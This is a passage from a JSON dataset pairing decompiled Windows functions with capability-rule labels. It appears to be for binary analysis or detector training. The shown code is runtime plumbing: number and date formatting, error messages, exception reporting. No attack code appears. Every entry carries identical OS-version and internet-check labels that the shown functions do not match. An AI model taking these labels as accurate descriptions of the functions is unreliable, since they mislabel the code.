*(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040b4aa;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040b4aa:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040b4bd;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040b4bd:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040b4c0;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040b3e8;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b4c0:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1195
    },
    "0040b5bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b5bc(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x49580f;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040b673();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040b67e();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040b67e();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040b69a(iVar4);\n        }\n        fcn.0040b673();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00404124();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 535
    },
    "0040be24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be24(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040bbd0(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040be5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be5c(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040b8f0(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0040c130": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c130(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40c8b4;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x48f828) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040e760();\n                uVar6 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar6 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar6 + 0xbf < 0x1a) && (uVar3 = uVar6,  uVar6 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar6 = 0x4e;\n                    uVar3 = uVar6;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (57 cases) at 0x40c251\n                switch(uVar6) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x48f828) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040e760();\n                        }\n                    }\n                    fcn.0040bd4c(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040bd4c(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x495811 != '\\0') {\n                        fcn.0040bd4c(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x49581c != '\\0') {\n                        fcn.0040bd4c(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040be5c(&stack0xfffffffc);\n                    iVar5 = fcn.0040a9ec();\n                    if (iVar5 == 0) {\n                        fcn.0040bd4c(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.0040a9ec();\n                        if (iVar5 == 0) {\n                            fcn.0040bd4c(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.0040a9ec();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040bd90(arg_8h);\n                                }\n                                else {\n                                    fcn.0040bd90(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.0040a9ec();\n                                if (iVar5 == 0) {\n                                    fcn.0040be24(&stack0xfffffffc);\n                                    uVar7 = *(arg_8h + 8);\n                                    fcn.0040bc60(uVar7, *(arg_8h + 0xc));\n                                    fcn.0040bd90(uVar7);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.0040a9ec();\n                                    if (iVar5 == 0) {\n                                        fcn.0040be24(&stack0xfffffffc);\n                                        uVar7 = *(arg_8h + 8);\n                                        fcn.0040bc60(uVar7, *(arg_8h + 0xc));\n                                        fcn.0040bd90(uVar7);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040bd4c(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040c130(arg_8h);\n                    fcn.0040be5c(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040bd4c(arg_8h);\n                        fcn.0040c130(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040be24(&stack0xfffffffc);\n                        fcn.0040bdac(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bc60(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bd90(uVar7);\n                    }\n                    else if (var_ch == 4) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bc60(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bd90(uVar7);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040c130(arg_8h);\n                    }\n                    else {\n                        fcn.0040c130(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be24(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040c018(&stack0xfffffffc);\n                    fcn.0040bd90(iVar5);\n                    break;\n                case 0x47:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be24(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040be9c(&stack0xfffffffc);\n                    fcn.0040bd90(iVar5);\n                    break;\n                case 0x48:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be5c(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (*puVar4 != 0) {\n                        if ((*((*puVar4 >> 3) + 0x48f828) >> (*puVar4 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040c4a6;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040c4a6:\n                                if (!bVar2) {\n                                    iVar5 = fcn.0040a9ec();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.0040a9ec(),  iVar5 != 0)) {\n                                        fcn.0040a9ec();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040e760();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdac(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be24(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bdac(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040bd90(arg_8h);\n                    }\n                    else {\n                        fcn.0040bd90(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be5c(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdac(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be5c(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdac(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040c130(arg_8h);\n                    }\n                    else {\n                        fcn.0040c130(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be24(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040bdac(arg_8h);\n                    }\n                    else {\n                        fcn.0040bdac(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040bdf8(&stack0xfffffffc);\n                    fcn.0040be5c(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040bdac(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040e740();\n                fcn.0040bd4c(iVar5);\n                var_4h = fcn.0040e760();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40c8bb;\n    uStack68 = 0x40c8b3;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2781
    },
    "0040cba4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040cba4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x4958d8;\n    puVar4 = 0x4958f4;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.004059dc();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.0040e988();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 228
    },
    "0040cbf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cbf8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x4958cc == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040bd38();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 243
    },
    "0040cc54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cc54(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort var_18h;\n    uint var_16h;\n    ushort var_12h;\n    ushort var_10h;\n    char var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_8h = 0;\n    uStack64 = 0x40cf76;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_16h._0_2_ = 0;\n    var_18h = 0;\n    var_1ch._0_1_ = 0;\n    var_dh = 0;\n    var_eh = fcn.0040cb10();\n    var_4h = 0;\n    if (**0x495814 == 'g') {\n        fcn.0040cb5c();\n        fcn.00405a44(&fcn.0040cc54::var_20h);\n        fcn.00409b6c();\n        var_4h = fcn.0040cba4();\n    }\n    else {\n        iVar2 = fcn.0040e8bc();\n        if (0 < iVar2) {\n            var_4h = *0x4958f4;\n        }\n    }\n    cVar1 = fcn.0040c968(&fcn.0040cc54::var_1ch + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040cad4(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40cd42;\n        cVar1 = fcn.0040c968(&fcn.0040cc54::var_1ch + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040cad4();\n            if (cVar1 == '\\0') {\n                fcn.0040bd38();\n                if (var_eh == '\\x01') {\n                    var_18h = var_10h;\n                    var_16h._0_2_ = var_12h;\n                }\n                else {\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040cc54::var_1ch + 1;\n                cVar1 = fcn.0040c968(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040cf53;\n                if (var_eh == '\\0') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n                else if (var_eh == '\\x01') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_10h;\n                }\n                else if (var_eh == '\\x02') {\n                    var_1ch._0_1_ = var_1ch._3_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_16h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_1ch < 3) {\n                        fcn.0040bd38();\n                    }\n                }\n                else {\n                    fcn.0040cbf8(&stack0xfffffffc);\n                }\n            }\n            fcn.0040cad4();\n            fcn.0040c944();\n            if ((*0x4958d4 != '\\0') && (iVar2 = fcn.00405b28(),  iVar2 != 0)) {\n                if (**0x495828 - 0x30U < 10) {\n                    fcn.0040cb5c();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.0040580c(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040c944();\n                        iVar2 = fcn.0040580c();\n                        if (iVar2 < *param_2) break;\n                        fcn.0040580c();\n                        fcn.00405a44();\n                        iVar2 = fcn.00409b08();\n                        if (iVar2 == 0) break;\n                        fcn.0040580c();\n                        fcn.00405a44();\n                        iVar2 = fcn.00409b08();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_dh = fcn.0040b988(var_ch);\n            in_stack_ffffffac = var_ch;\n        }\n    }\ncode_r0x0040cf53:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405554(0x40cf7d);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1304
    },
    "0040cfa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040cfa0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040c9fc();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040c9fc(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040c9fc();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040c9fc(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040c944();\n    }\n    cVar1 = fcn.0040c968(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        arg_8h_00 = 0x40d052;\n        cVar1 = fcn.0040cad4();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = &stack0xffffffe8;\n            cVar1 = fcn.0040c968(arg_8h_00);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xd080;\n            cVar1 = fcn.0040cad4();\n            if (cVar1 != '\\0') {\n                arg_8h = &stack0xffffffe4;\n                cVar1 = fcn.0040c968(arg_8h);\n                in_stack_ffffffd4 = arg_8h;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40d0ae;\n                cVar1 = fcn.0040cad4();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040c968(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040c9fc();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040c9fc(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040c9fc();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040c9fc(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040c944();\n            uVar2 = fcn.0040b840(in_stack_ffffffd0, arg_8h_00 >> 0x10);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 825
    },
    "0040d39c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d39c(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040d324(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.00407550();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0040d4fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d4fc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x4958d4) == 0) {\n            fcn.00405728();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 106
    },
    "0040da24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040da24(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40da38;\n    fcn.0040d89c(0x400);\n    if (**0x492658 == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x492370 + 4);\n        puStack1112 = 0x40daba;\n        puStack1112 = fcn.00406a10();\n        uStack1116 = 0x40dac0;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40da4c;\n        fcn.00403820();\n        puStack1100 = 0x40da51;\n        fcn.0040305c();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40da60;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40da70;\n        uStack1116 = fcn.0040a858();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40da7d;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40dae8, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "0040df44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040df44(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40e0ff;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.00407550();\n    }\n    else {\n        fcn.00407550();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.004057a0();\n            fcn.0040a67c();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.00407550();\n            fcn.0040db28(arg_8h_00, puVar4);\n            goto code_r0x0040e0ce;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.00407550();\n    fcn.0040db28(arg_8h_00, puVar4);\ncode_r0x0040e0ce:\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00405530(0x40e106);\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 859
    },
    "0040e26c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
